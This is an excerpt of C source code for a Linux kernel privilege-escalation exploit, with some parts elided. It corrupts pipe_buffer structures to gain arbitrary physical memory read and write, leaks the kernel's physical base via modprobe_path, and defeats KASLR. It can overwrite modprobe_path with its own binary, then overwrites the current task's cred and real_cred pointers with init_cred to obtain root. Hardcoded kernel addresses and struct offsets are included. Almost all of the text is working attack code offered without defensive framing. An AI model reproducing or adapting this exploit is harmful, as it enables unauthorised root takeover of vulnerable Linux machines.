...
static bool show_slabinfo;
static bool show_leaked_key;
static bool show_physmem;
static bool overwrite_modprobe_path;
...
#define vmlinux_init_cred 0xFFFFFFFF82C513C0ULL
#define vmlinux_pcpu_base_addr 0xFFFFFFFF82B14170ULL
#define vmlinux_current 0x2A640ULL
#define PUD_MASK ((1ULL << 30) - 1)
#define OFFSETOF_TASK_CRED 0x348
#define OFFSETOF_TASK_COMM 0x378
#define OFFSETOF_TASK_REAL_CRED 0x4a8
...
static bool is_pipe_data_corrupted(const char *buf, size_t n) {
  size_t i;
...
static void leak_vmlinux_physaddr(struct exploit *e) {
  ...
  for (j = 0; e->vmlinux_physaddr == -1; j++) {
    long physaddr;
    ...
    for (i = 0; i < PIPE_COUNT; i++) {
      ...
      if (is_pipe_data_corrupted(buf, sizeof(buf))) {
        if (show_physmem) {
          hexdump(buf, sizeof(buf));
        }
        if (memcmp(buf, sbin_modprobe, sizeof(buf)) == 0) {
          e->vmlinux_physaddr = physaddr - (vmlinux_modprobe_path - vmlinux);
          printf("\nvmlinux_physaddr = 0x%lx\n", e->vmlinux_physaddr);
        }
...
static void phys_rw(struct exploit *e, long physaddr, void *rwbuf,
                    size_t rwsize, bool is_write) {
  struct pipe_buffer *pipe_buffer;
  char key_buf[KEY_SIZE];
  size_t i;
  ...
  pipe_buffer->len = physaddr & (PAGE_SIZE - 1);
  if (!is_write) {
    /*
     * Keep the corrupted pipe_buffer allocated by reading 1 character less
     * than what is available. This prevents page reference count decrement.
     */
    pipe_buffer->len += rwsize + 1;
  }
  pipe_buffer->ops = e->pipe_buffer.ops;
  pipe_buffer->flags = e->pipe_buffer.flags;
  ...
  for (i = 0; i < PIPE_COUNT; i++) {
    ...
    check_syscall(read(e->pipes[i][0], buf, bufsize));
    if (is_pipe_data_corrupted(buf, bufsize)) {
      if (show_physmem) {
        hexdump(buf, bufsize);
      }
      if (is_write) {
        check_syscall(write(e->pipes[i][1], rwbuf, rwsize));
      } else {
        check_syscall(read(e->pipes[i][0], rwbuf, rwsize));
      }
      e->corrupted_pipe_index = i;
      break;
    }
...
int main(int argc, char **argv) {
  long page_offset_base = -1;
  long pcpu_base_addr = -1;
  long current = -1;
  struct exploit e;
  long init_cred;
  ...
  leak_vmlinux_physaddr(&e);

  if (overwrite_modprobe_path) {
    char self_exe[256] = {};

    check_syscall(readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1));
    phys_rw(&e, e.vmlinux_physaddr + (vmlinux_modprobe_path - vmlinux),
            self_exe, strlen(self_exe) + 1, true);
  }

  phys_rw(&e, e.vmlinux_physaddr + (vmlinux_pcpu_base_addr - vmlinux),
          &pcpu_base_addr, sizeof(pcpu_base_addr), false);
  printf("pcpu_base_addr = 0x%lx\n", pcpu_base_addr);
  /*
   * KASLR granularity is PUD, see kernel_randomize_memory().
   */
  page_offset_base = pcpu_base_addr & ~PUD_MASK;
  printf("page_offset_base = 0x%lx\n", page_offset_base);

  phys_rw(&e, pcpu_base_addr + vmlinux_current - page_offset_base, &current,
          sizeof(current), false);
  printf("current = 0x%lx\n", current);

  init_cred =
      page_offset_base + e.vmlinux_physaddr + (vmlinux_init_cred - vmlinux);
  printf("init_cred = 0x%lx\n", init_cred);
  phys_rw(&e, current + OFFSETOF_TASK_REAL_CRED - page_offset_base, &init_cred,
          sizeof(init_cred), true);
  phys_rw(&e, current + OFFSETOF_TASK_CRED - page_offset_base, &init_cred,
          sizeof(init_cred), true);
